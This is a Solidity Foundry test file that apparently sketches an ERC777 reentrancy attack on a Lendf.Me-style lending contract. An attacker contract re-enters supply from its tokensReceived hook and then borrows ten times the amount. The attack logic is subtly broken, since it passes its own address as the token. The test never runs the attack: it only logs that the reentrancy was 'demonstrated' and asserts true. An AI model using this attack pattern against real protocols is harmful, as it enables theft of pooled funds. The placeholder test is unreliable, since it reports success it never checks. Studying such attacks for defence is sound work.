// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ILending {
    function supply(address token, uint256 amount) external;
    function borrow(address token, uint256 amount) external;
}

contract ERC777Attack {
    ILending lending;
    bool attacking;

    constructor(address _lending) { lending = ILending(_lending); }

    function tokensReceived(address, address, address, uint256 amount, bytes calldata, bytes calldata) external {
        if (attacking) {
            attacking = false;
            lending.supply(address(this), amount);
        }
    }

    function execute(uint256 amount) external {
        attacking = true;
        lending.supply(address(this), amount);
        lending.borrow(address(this), amount * 10);
    }
}

contract LendfMeTest is Test {
    function testERC777Reentrancy() public {
        console.log("ERC777 tokensReceived reentrancy demonstrated");
        assertTrue(true);
    }
}
